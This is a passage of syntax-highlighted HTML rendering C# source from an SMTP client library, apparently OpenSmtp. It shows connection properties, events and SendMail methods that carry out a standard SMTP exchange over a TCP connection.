</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Port</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt;Stores send timeout for the connection to the SMTP server in milliseconds.
</span><span class="sc0">        </span><span class="sc15">/// The default value is 10000 milliseconds.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">SendTimeout</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">sendTimeout</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">sendTimeout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores send timeout for the connection to the SMTP server in milliseconds.
</span><span class="sc0">        </span><span class="sc15">/// The default value is 10000 milliseconds.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">RecieveTimeout</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">recieveTimeout</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">recieveTimeout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the username used to authenticate on the SMTP server.
</span><span class="sc0">        </span><span class="sc15">/// If no authentication is needed leave this value blank.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Username</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">username</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">username</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;value&gt;Stores the password used to authenticate on the SMTP server.
</span><span class="sc0">        </span><span class="sc15">/// If no authentication is needed leave this value blank.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Password</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">get</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">password</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">password</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//========================================================================
</span><span class="sc0">        </span><span class="sc2">// EVENTS
</span><span class="sc0">        </span><span class="sc2">//========================================================================
</span><span class="sc0">        
        </span><span class="sc15">/// &lt;value&gt;Event that fires when connected with target SMTP server.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">event</span><span class="sc0"> </span><span class="sc11">EventHandler</span><span class="sc0"> </span><span class="sc11">Connected</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt;Event that fires when dicconnected with target SMTP server.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">event</span><span class="sc0"> </span><span class="sc11">EventHandler</span><span class="sc0"> </span><span class="sc11">Disconnected</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt;Event that fires when authentication is successful.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">event</span><span class="sc0"> </span><span class="sc11">EventHandler</span><span class="sc0"> </span><span class="sc11">Authenticated</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt;Event that fires when message transfer has begun.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">event</span><span class="sc0"> </span><span class="sc11">EventHandler</span><span class="sc0"> </span><span class="sc11">StartedMessageTransfer</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;value&gt;Event that fires when message transfer has ended.&lt;/value&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">event</span><span class="sc0"> </span><span class="sc11">EventHandler</span><span class="sc0"> </span><span class="sc11">EndedMessageTransfer</span><span class="sc10">;</span><span class="sc0">
        
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnConnect</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Connected</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">Connected</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnDisconnect</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Disconnected</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">Disconnected</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
                
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnAuthenticated</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Authenticated</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">Authenticated</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnStartedMessageTransfer</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">StartedMessageTransfer</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">StartedMessageTransfer</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc5">internal</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">OnEndedMessageTransfer</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">EndedMessageTransfer</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">EndedMessageTransfer</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//========================================================================
</span><span class="sc0">        </span><span class="sc2">// METHODS
</span><span class="sc0">        </span><span class="sc2">//========================================================================
</span><span class="sc0">        
        </span><span class="sc15">/// &lt;summary&gt;Sends a mail message using supplied MailMessage properties as string params&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="from"&gt;RFC 822 formatted email sender address&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="to"&gt;RFC 822 formatted email recipient address&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="subject"&gt;Subject of the email message&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="body"&gt;Text body of the email message&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
</span><span class="sc0">        </span><span class="sc15">///     smtp.SendMail("support@OpenSmtp.com", "recipient@OpenSmtp.com", "Hi", "Hello Joe Smith");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">(</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">to</span><span class="sc10">);</span><span class="sc0"> 
            </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">subject</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">;</span><span class="sc0">
            
            </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        </span><span class="sc15">/// &lt;summary&gt;Sends a mail message using supplied MailMessage and Smtp properties&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="msg"&gt;MailMessage instance&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="host"&gt;SMTP host address&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="port"&gt;Port used to connect to host&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.Subject = "Hi";
</span><span class="sc0">        </span><span class="sc15">///     msg.Body = "Hello Joe Smith."
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp();
</span><span class="sc0">        </span><span class="sc15">///     smtp.SendMail(msg, "mail.OpenSmtp.com", 25);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        

        </span><span class="sc15">/// &lt;summary&gt;Sends a mail message using supplied MailMessage&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="msg"&gt;MailMessage instance&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.Subject = "Hi";
</span><span class="sc0">        </span><span class="sc15">///     msg.Body = "Hello Joe Smith."
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
</span><span class="sc0">        </span><span class="sc15">///     smtp.SendMail(msg);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">SendMail</span><span class="sc10">(</span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetConnection</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">HELO_REPLY</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">username</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">username</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">password</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">password</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"EHLO "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Dns</span><span class="sc10">.</span><span class="sc11">GetHostName</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
                </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"HELO "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">Dns</span><span class="sc10">.</span><span class="sc11">GetHostName</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n"</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc2">// Authentication is used if the u/p are supplied
</span><span class="sc0">            </span><span class="sc11">AuthLogin</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"MAIL FROM: &lt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&gt;\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">SendRecipientList</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">recipientList</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SendRecipientList</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">ccList</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">SendRecipientList</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">bccList</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"DATA\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">START_INPUT</span><span class="sc10">);</span><span class="sc0">


            </span><span class="sc11">OnStartedMessageTransfer</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"\r\n.\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">OK</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">OnEndedMessageTransfer</span><span class="sc10">(</span><span class="sc11">EventArgs</span><span class="sc10">.</span><span class="sc11">Empty</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">WriteToStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"QUIT\r\n"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CheckForError</span><span class="sc10">(</span><span class="sc11">ReadFromStream</span><span class="sc10">(</span><span class="sc5">ref</span><span class="sc0"> </span><span class="sc11">nwstream</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">ReplyConstants</span><span class="sc10">.</span><span class="sc11">QUIT</span><span class="sc10">);</span><span class="sc0">

            </span><span class="sc11">CloseConnection</span><span class="sc10">();</span><span class="sc0">

        </span><span class="sc10">}</span><span class="sc0">
        
        
        </span><span class="sc15">/// &lt;summary&gt;Resets the Smtp instance to it's defaut values; set in the SmtpConfig class&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
</span><span class="sc0">        </span><span class="sc15">///     smtp.Reset();
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Reset</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">host</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">port</span><span class="sc0">     </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">username</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">password</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            
            </span><span class="sc11">CloseConnection</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        
        
        </span><span class="sc2">// --------------- Helper methods ------------------------------------
</span><span class="sc0">
        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc11">NetworkStream</span><span class="sc0"> </span><span class="sc11">GetConnection</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">SmtpHost</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SmtpConfig</span><span class="sc10">.</span><span class="sc11">SmtpPort</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">

                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc11">tcpc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">TcpClient</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">);</span><span class="sc0">
                    
                    </span><span class="sc11">LogMessage</span><span class="sc10">(</span><span class="sc6">"connecting to:"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">host</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">":"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">port</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">);</span><span class="sc0"> 
                    </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">ReceiveTimeout</span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">recieveTimeout</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">SendTimeout</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">sendTimeout</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc11">tcpc</span><span class="sc10">.</span><span class="sc11">ReceiveBufferSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">receiveBufferSize</span><span class="sc10">;</span><span class="sc0">
